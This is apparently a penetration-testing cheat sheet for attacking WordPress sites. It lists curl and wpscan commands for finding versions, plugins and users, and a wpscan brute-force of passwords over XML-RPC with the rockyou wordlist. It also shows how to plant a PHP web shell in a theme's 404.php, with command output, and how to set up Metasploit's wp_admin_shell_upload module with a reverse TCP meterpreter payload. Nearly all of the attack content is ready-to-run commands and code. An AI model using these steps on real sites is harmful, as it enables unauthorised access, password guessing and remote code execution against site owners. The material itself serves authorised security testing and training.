## Wordpress

### Enumeration
Interesting files :

```bash
/robots.txt
/wp-sitemap.xml
/wp-admin/admin-ajax.php
/wp-login.php
wp-content/plugins
wp-content/themes
```

Enumeration commands (versions, plugins, themes) :

```bash
curl -s -X GET http://$TARGET | grep '<meta name="generator"'
curl -s -X GET http://$TARGET | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
curl -s -X GET http://$TARGET | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

wpscan --url http://$TARGET --enumerate --api-token <API_TOKEN>
```

Retrieve users :
```bash
curl http://$TARGET/wp-json/wp/v2/users | jq
curl -s -I http://$TARGET/?author=1 #then 2 3 ... 
```

Get all accepted XML-RPC methods :
```bash
curl -s -X POST http://$TARGET/xmlrpc.php -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" -v
```

### Exploitation

Bruteforcing user's password

```bash
wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://$TARGET
```

- Check for vulnerable plugins

As admin We can edit 404.php file from a theme as a reverse shell (and get RCE) 

Editing (for example) : 

```bash
http://$TARGET/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
```

Add :
```php
system($_GET[0]);
# or https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

Trigger : 
```bash
curl http://$TARGET/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Same steps using metasploit : 
```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost $tun0
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost $target_ip  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST vhost (if needed)
```
